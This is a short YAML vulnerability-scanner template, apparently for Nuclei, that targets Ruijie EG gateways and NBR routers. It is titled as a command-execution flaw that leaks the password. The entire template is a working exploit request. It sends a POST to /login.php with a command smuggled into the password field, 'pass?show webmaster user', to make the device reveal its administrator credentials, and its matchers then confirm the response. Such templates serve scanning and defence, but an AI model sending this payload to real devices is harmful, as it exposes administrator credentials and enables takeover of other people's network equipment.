id: Ruijie-EG-passLeak
info:
  author: str1am
  name: "\u9510\u6377EG\u6613\u7F51\u5173\u4E0ENBR\u8DEF\u7531\u5668\u547D\u4EE4\u6267\
    \u884C\u6F0F\u6D1E"
  reference:
  - https://blog.csdn.net/qq_41617034/article/details/119532322
  severity: high
  tags: EG,rce
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - data
    - status
    - WORD
  matchers-condition: and
  raw:
  - 'POST /login.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101
    Firefox/92.0


    username=admin&password=pass?show webmaster user

    '
